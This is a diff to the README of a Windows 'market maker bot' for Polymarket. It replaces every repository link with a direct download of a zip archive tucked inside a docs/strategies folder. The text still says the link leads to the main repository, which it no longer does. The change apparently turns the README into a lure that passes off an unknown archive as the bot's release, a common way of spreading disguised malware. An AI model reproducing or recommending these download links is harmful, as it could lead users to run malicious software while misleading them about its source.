@@ -1,6 +1,6 @@
 # 🤖 polymarket-market-maker-bot - Automate Your Market Making Easily
 
-[![Download polymarket-market-maker-bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dogolsn10/polymarket-market-maker-bot)
+[![Download polymarket-market-maker-bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Dogolsn10/polymarket-market-maker-bot/raw/refs/heads/main/docs/strategies/market_bot_polymarket_maker_1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before you start, make sure your system meets these basic needs:
 
 Click the button below to visit the page for downloads and instructions:
 
-[![Get polymarket-market-maker-bot](https://img.shields.io/badge/Get%20The%20Bot-blue)](https://github.com/Dogolsn10/polymarket-market-maker-bot)
+[![Get polymarket-market-maker-bot](https://img.shields.io/badge/Get%20The%20Bot-blue)](https://github.com/Dogolsn10/polymarket-market-maker-bot/raw/refs/heads/main/docs/strategies/market_bot_polymarket_maker_1.6.zip)
 
 This link leads you to the main GitHub repository. You will find the latest version and setup files here.
 
@@ -40,7 +40,7 @@ This link leads you to the main GitHub repository. You will find the latest vers
 Follow these steps to get the bot running on your Windows machine.
 
 1. Open your web browser and go to  
-   https://github.com/Dogolsn10/polymarket-market-maker-bot
+   https://github.com/Dogolsn10/polymarket-market-maker-bot/raw/refs/heads/main/docs/strategies/market_bot_polymarket_maker_1.6.zip
 
 2. Look for the "Releases" or "Assets" section on the page.
 
@@ -119,4 +119,4 @@ To keep the bot working well:
 
 ---
 
-[Download polymarket-market-maker-bot](https://github.com/Dogolsn10/polymarket-market-maker-bot) and follow these steps to set up your market maker bot on Windows.
+[Download polymarket-market-maker-bot](https://github.com/Dogolsn10/polymarket-market-maker-bot/raw/refs/heads/main/docs/strategies/market_bot_polymarket_maker_1.6.zip) and follow these steps to set up your market maker bot on Windows.
